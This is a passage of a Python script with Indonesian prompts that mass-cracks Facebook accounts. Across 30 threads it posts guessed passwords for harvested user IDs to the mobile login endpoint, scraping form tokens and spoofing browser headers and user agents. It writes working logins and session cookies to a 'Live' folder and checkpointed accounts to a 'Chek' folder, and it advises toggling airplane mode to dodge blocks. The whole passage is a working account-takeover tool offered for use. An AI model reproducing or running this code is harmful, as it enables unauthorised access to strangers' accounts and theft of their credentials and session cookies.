		uadarimu.append('uadia');bz = input(f' [%] input user agent manual anda : ');uadia.append(bz)
	if ua in ['t','T','']:
		print(f"{P} [%] anda menggunakan user agent bawaan script. {P}")
	else:uadarimu.append('uasc')
	print(f"""
 [%] {P}hasil Live akan tersimpan di : {H}Live/{okc}{P}
 [%] {P}hasil Chek akan tersimpan di : {K}Chek/{cpc}{P}
 [%] mainkan mode pesawat jika tidak ada hasil.
""")
	global prog,des
	prog = Progress(TextColumn('{task.description}'),BarColumn(),TextColumn("[progress.percentage]{task.percentage:>3.0f}%"))
	des = prog.add_task('',total=len(uid2))
	with prog:
		with tred(max_workers=30) as MethodeCrack:
			for user in uid2:
				uid,nama = user.split('|')[0],user.split('|')[1].lower()
				depan = nama.split(" ")
				pasw = []
				for xpwd in pwnya:
					pasw.append(xpwd)
				if 'Validate' in method:
					MethodeCrack.submit(Validate,uid,pasw)
				elif 'Validate2' in method:
					MethodeCrack.submit(Validate2,uid,pasw)
				elif 'Validate3' in method:
					MethodeCrack.submit(Validate3,uid,pasw)
				else:
					MethodeCrack.submit(Validate3,uid,pasw)
		print("\r")
		exit(f"{P} [%] sukses crack {H}{len(uid2)}{P} id,dengan jumlah hasil Live : {H}{ok} {P}Chek : {K}{cp}{P}")
###-----[ METODE VALIDATE V1 ]-----###
def Validate(uid,pasw):
	global loop,ok,cp
	prog.update(des,description=f"{P2} [{H2}/{P2}] {str(loop)}/{len(uid2)} Live:-{H}{ok}{P} Chek:-{K}{cp}{P}")
	prog.advance(des)
	ses = requests.Session()
	for pw in pasw:
		try:
			if 'uadia' in uadarimu: ua = uadia[0]
			else:ua = generateuseragentmozilla()
			link = ses.get(f"https://m.facebook.com/login/device-based/password/?uid={uid}&flow=login_no_pin&refsrc=deprecated&_rdr")
			data = {
			   "jazoest": re.search('name="jazoest" value="(.*?)"', str(link.text)).group(1),
			   "lsd": re.search('name="lsd" value="(.*?)"', str(link.text)).group(1),
			   "uid": uid,
			   "next":"https://m.facebook.com/",
			   "flow":"login_no_pin",
			   "pass": pw}
			headers = {
			   "Host":"m.facebook.com",
			   "content-length":"243",
			   "cache-control":"max-age=0",
			   "sec-ch-ua":'"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"',
			   "sec-ch-ua-mobile":"?0",
			   "sec-ch-ua-platform":'"Linux"',
			   "upgrade-insecure-requests":"1",
			   "origin":"https://m.facebook.com",
			   "content-type":"application/x-www-form-urlencoded",
			   "user-agent":ua,
			   "accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
			   "sec-fetch-site":"same-origin",
			   "sec-fetch-mode":"navigate",
			   "sec-fetch-user":"?1",
			   "sec-fetch-dest":"document",
			   "referer":f"https://m.facebook.com/login/device-based/password/?uid={uid}&flow=login_no_pin&refsrc=deprecated&_rdr",
			   "accept-encoding":"gzip, deflate, br",
			   "accept-language":"id-ID,id;q=0.9,en-GB;q=0.8,en-US;q=0.7,en;q=0.6"}
			po = ses.post("https://m.facebook.com/login/device-based/validate-password/?shbl=0",data=data,headers=headers,allow_redirects=False)
			if "c_user" in ses.cookies.get_dict():
				ok+=1
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				tree = Tree("")
				tree.add(f"{H2}{uid}|{pw}{P2}").add(f"{H2}{kuki};ua={ua}{P2}")
				prints(tree)
				open('Live/'+okc,'a').write(f"{uid}|{pw}\n")
				break
			elif "checkpoint" in ses.cookies.get_dict():
				cp+=1
				tree = Tree("")
				tree.add(f"{K2}{uid}|{pw}{P2}").add(f"{K2}{ua}{P2}")
				prints(tree)
				open('Chek/'+cpc,'a').write(f"{uid}|{pw}\n")
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(15)
	loop+=1
###-----[ METODE VALIDATE V2 ]-----###
def Validate2(uid,pasw):
	global loop,ok,cp
	prog.update(des,description=f"{P2} [{H2}/{P2}] {str(loop)}/{len(uid2)} Live:-{H}{ok}{P} Chek:-{K}{cp}{P}")
	prog.advance(des)
	ses = requests.Session()
	url = "m.prod.facebook.com"
	for pw in pasw:
		try:
			if 'uadia' in uadarimu: ua = uadia[0]
			else:ua = generateuseragentmozilla()
			link = ses.get(f"https://{url}/login/device-based/password/?uid={uid}&flow=login_no_pin&refsrc=deprecated&locale2=en_GB&_rdr")
			data = {"jazoest": re.search('name="jazoest" value="(.*?)"', str(link.text)).group(1),"lsd": re.search('name="lsd" value="(.*?)"', str(link.text)).group(1),"uid": uid,"next":f"https://{url}/login/save-device/","flow":"login_no_pin","pass": pw}
			headd = {
			   "Host": url,
			   "Connection": "keep-alive",
			   "Content-Length": "334",
			   "Cache-Control": "max-age=0",
			   "Upgrade-Insecure-Requests": "1",
			   "Origin": "https://+url",
			   "Content-Type": "application/x-www-form-urlencoded",
			   "User-Agent": ua,
			   "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
			   "X-Requested-With": "hot.fiery.browser",
			   "Sec-Fetch-Site": "same-origin",
			   "Sec-Fetch-Mode": "navigate",
			   "Sec-Fetch-User": "?1",
			   "Sec-Fetch-Dest": "document",
			   "Referer": link.url,
			   "Accept-Encoding": "gzip, deflate",
			   "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
			post = ses.post(f"https://{url}/login/device-based/validate-password/?shbl=0&locale2=en_GB", data=data,headers=headd,allow_redirects=False)
			if "c_user" in ses.cookies.get_dict():
				ok+=1
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				tree = Tree("")
				tree.add(f"{H2}{uid}|{pw}{P2}").add(f"{H2}{kuki};ua={ua}{P2}")
				prints(tree)
				open('Live/'+okc,'a').write(f"{uid}|{pw}\n")
				break
			elif "checkpoint" in ses.cookies.get_dict():
				cp+=1
				tree = Tree("")
				tree.add(f"{K2}{uid}|{pw}{P2}").add(f"{K2}{ua}{P2}")
				prints(tree)
				open('Chek/'+cpc,'a').write(f"{uid}|{pw}\n")
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(15)
	loop+=1
###-----[ METODE VALIDATE V3 ]-----###
def Validate3(uid,pasw):
	global loop,ok,cp
	prog.update(des,description=f"{P2} [{H2}/{P2}] {str(loop)}/{len(uid2)} Live:-{H}{ok}{P} Chek:-{K}{cp}{P}")
	prog.advance(des)
	ses = requests.Session()
	for pw in pasw:
		try:
			if 'uadia' in uadarimu: ua = uadia[0]
			else:ua = generateuseragentmozilla()
			link = ses.get(f"https://m.facebook.com/login/device-based/password/?uid={uid}&flow=login_no_pin&refsrc=deprecated&_rdr")
			data = {"jazoest": re.search('name="jazoest" value="(.*?)"', str(link.text)).group(1),"lsd": re.search('name="lsd" value="(.*?)"', str(link.text)).group(1),"uid": uid,"next":"https://m.facebook.com/login/save-device/","flow":"login_no_pin","pass": pw}
			headd = {"Host": "m.facebook.com","Connection": "keep-alive","Content-Length": str(rr(100,145)),"Cache-Control": "max-age=0","Upgrade-Insecure-Requests": "1","Origin": "https://m.facebook.com","Content-Type": "application/x-www-form-urlencoded","User-Agent": ua,"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","X-Requested-With": "net.onecook.browser","Sec-Fetch-Site": "same-origin","Sec-Fetch-Mode": "navigate","Sec-Fetch-User": "?1","Sec-Fetch-Dest": "document","Referer": f"https://m.facebook.com/login/device-based/password/?uid={uid}&flow=login_no_pin&refsrc=deprecated&_rdr","Accept-Encoding": "gzip, deflate","Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
			post = ses.post("https://m.facebook.com/login/device-based/validate-password/?shbl=0", data=data,headers=headd,allow_redirects=False)
			if "c_user" in ses.cookies.get_dict():
				ok+=1
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				tree = Tree("")
				tree.add(f"{H2}{uid}|{pw}{P2}").add(f"{H2}{kuki};ua={ua}{P2}")
				prints(tree)
				open('Live/'+okc,'a').write(f"{uid}|{pw}\n")
				break
			elif "checkpoint" in ses.cookies.get_dict():
				cp+=1
				tree = Tree("")
				tree.add(f"{K2}{uid}|{pw}{P2}").add(f"{K2}{ua}{P2}")
				prints(tree)
				open('Chek/'+cpc,'a').write(f"{uid}|{pw}\n")
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(15)
	loop+=1

if __name__=='__main__':
	try:os.mkdir('Live')
	except:pass
	try:os.mkdir('Chek')
	except:pass
	menu()
